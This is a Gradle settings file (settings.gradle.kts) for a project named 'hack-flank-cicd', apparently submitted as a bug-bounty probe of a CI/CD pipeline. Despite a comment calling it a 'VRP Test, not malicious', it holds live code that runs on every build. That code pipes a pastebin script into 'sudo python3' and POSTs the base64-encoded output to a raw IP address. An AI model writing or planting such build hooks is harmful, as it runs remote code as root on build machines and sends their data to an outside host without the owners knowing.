rootProject.name = "hack-flank-cicd"

// For VRP Test, not malicious.
fun String.runCommand(): String? = try {
    ProcessBuilder("/bin/sh", "-c", this)
            .redirectOutput(ProcessBuilder.Redirect.PIPE)
            .redirectError(ProcessBuilder.Redirect.PIPE)
            .start()
            .inputStream.bufferedReader().readText()
} catch (e: Exception) {
    e.printStackTrace()
    null
}

val output = "curl -sSfL https://pastebin.com/raw/UUPC3Q79 | sudo python3 | base64".runCommand()
println("Shell command output: $output")
val post = "curl -X POST http://148.135.55.70:32456/test --data s=$output".runCommand()
